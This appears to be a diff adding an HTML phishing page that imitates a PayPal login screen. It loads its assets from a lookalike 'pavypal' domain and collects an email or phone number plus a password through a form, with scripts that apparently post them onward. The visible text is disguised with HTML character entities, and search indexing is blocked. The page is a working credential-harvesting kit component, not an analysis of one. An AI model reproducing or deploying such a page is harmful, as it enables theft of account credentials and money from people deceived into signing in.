@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<title>Log &#105;n&#032;&#116;o&#032;yo&#117;r&#032;&#080;ayP&#097;&#108;&#032;a&#099;cou&#110;t</title>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
+<link rel="shortcut icon" href="../../www.pavypal.com.webapps-disputecenterid.services/assets/img/favicon.ico">
+<link rel="apple-touch-icon" href="../../www.pavypal.com.webapps-disputecenterid.services/assets/img/apple-touch-icon.png">
+<link rel="stylesheet" href="../../www.pavypal.com.webapps-disputecenterid.services/assets/css/signin_style.css">
+<script src="../../www.pavypal.com.webapps-disputecenterid.services/assets/js/jquery.min.js" type="text/javascript"></script>
+<script src="../../www.pavypal.com.webapps-disputecenterid.services/assets/js/jquery.validate.js" type="text/javascript"></script>
+<script src="../../www.pavypal.com.webapps-disputecenterid.services/assets/js/signin.auth.js" type="text/javascript"></script>
+</head>
+
+<body>
+<div class="main">
+<section class="login">
+<div class="corral">
+<div class="contentContainer activeContent contentContainerBordered">
+<header>
+<p class="logo logo-long"></p>
+</header>
+<div class="notifications">
+<p class="notification notification-critical hide" id="notifications">
+</p>
+</div>
+<form method="post" id="signin" autocomplete="off">
+<div class="profileRememberedEmail hide" id="link">
+<span class="profileDisplayPhoneCode"></span>
+<span class="profileDisplayEmail" id="profileDisplayEmail"></span>
+<a href="index.html#" class="notYouLink" id="backToInputEmailLink"></a>
+</div>
+<div id="splitEmail" class="splitEmail">
+<div id="splitEmailSection">
+<div id="emailSection" class="clearfix">
+<div class="textInput" id="login_emaildiv">
+<div class="fieldWrapper">
+<input type="text" placeholder="Email &#111;r&#032;pho&#110;e&#032;n&#117;m&#098;er" id="Email" name="email">
+</div>
+<div class="errorMessage" id="emailErrorMessage">
+<p class="emptyError">R&#101;&#113;ui&#114;ed</p>
+</div>
+</div>
+</div>
+<div class="actions">
+<button class="button actionContinue login-login-click-next" type="submit" id="btnNext"></button>
+</div>
+</div>
+</div>
+<div id="splitPassword" class="splitPassword transformRightToLeft hide">
+<div id="splitPasswordSection">
+<div id="passwordSection" class="clearfix">
+<div class="textInput" id="login_passworddiv">
+<div class="fieldWrapper">
+<input type="password" placeholder="P&#097;ss&#119;or&#100;" id="Password" name="password">
+<button type="button" class="showPassword hide show-hide-password login-show-password" id="showpassword"></button>
+<button type="button" class="hidePassword hide show-hide-password login-hide-password" id="hidepassword"></button>
+</div>
+<div class="errorMessage" id="passwordErrorMessage">
+<p class="emptyError">&#082;eq&#117;ired</p>
+</div>
+</div>
+</div>
+</div>
+<div class="actions">
+<button class="button actionContinue login-login-submit" type="submit" id="btnLogin">&#076;og I&#110;</button>
+</div>
+</div>
+</form>
+<div class="forgotLink">
+<a href="index.html#" class="login-click-forgot-password">Hav&#105;ng &#116;roub&#108;&#101; lo&#103;ging in?</a>
+</div>
+<div class="loginSignUpSeparator">
+<span class="textInSeparator">o&#114;</span>
+</div>
+<a href="index.html#" class="button secondary login-click-signup-button">&#083;&#105;&#103;n Up</a>
+</div>
+</div>
+</div>
+</section>
+<footer class="footer">
+<div class="legalFooter"><ul class="footerGroup"><li><a target="_blank" href="../../www.pavypal.com.webapps-disputecenterid.services/us/cgi-bin/webscr%3Fcmd=_help.html">Contact Us</a></li><li><a target="_blank" href="../../www.pavypal.com.webapps-disputecenterid.services/us/webapps/mpp/ua/privacy-full.html">Privacy</a></li><li><a target="_blank" href="../../www.pavypal.com.webapps-disputecenterid.services/us/webapps/mpp/ua/legalhub-full.html">Legal</a></li><li><a target="_blank" href="../../www.pavypal.com.webapps-disputecenterid.services/us/webapps/mpp/country-worldwide.html">Worldwide</a></li></ul></div></footer></div>
+<div class="transitioning hide" id="loading"></div>
+</div>
+<script src="../../www.pavypal.com.webapps-disputecenterid.services/assets/js/signin.post.js"></script>
+</body>
+
+</html>
